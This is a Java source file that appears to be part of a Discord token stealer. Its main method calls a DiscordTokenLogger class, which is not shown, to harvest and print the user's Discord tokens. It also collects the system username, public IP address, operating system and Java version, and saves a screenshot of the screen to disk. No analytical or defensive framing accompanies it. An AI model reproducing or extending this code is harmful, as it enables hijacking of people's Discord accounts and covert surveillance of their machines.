import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;

public class Main {
    public static void main(String[] args) {
        System.out.print("Discord token: ");
        try {
            for(String s : DiscordTokenLogger.getTokens()) {
                System.out.print(s);
            }
        } catch (NullPointerException e) {
            System.out.println("NullPtr (are you using windows?)");
        }
        System.out.println("User name: " + getUserName());
        System.out.println("Public IP: " + getPublicIP());
        System.out.println("OS: " + getOS());
        System.out.println("Java version: " + getJavaVersion());
        screenshot();
    }

    public static void screenshot() {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture;
        try {
            capture = new Robot().createScreenCapture(screenRect);
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }

        File imageFile = new File("screen.jpg");
        try {
            ImageIO.write(capture, "jpg", imageFile);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        assert (imageFile.exists());
    }

    public static String getUserName() {
        return System.getProperty("user.name");
    }

    private static String getPublicIP() {
        String urlString = "http://checkip.amazonaws.com/";
        URL url;
        try {
            url = new URL(urlString);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
        try (BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()))) {
            return br.readLine();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static String getOS() {
        return System.getProperty("os.name");
    }

    public static String getJavaVersion() {
        return System.getProperty("java.version");
    }
}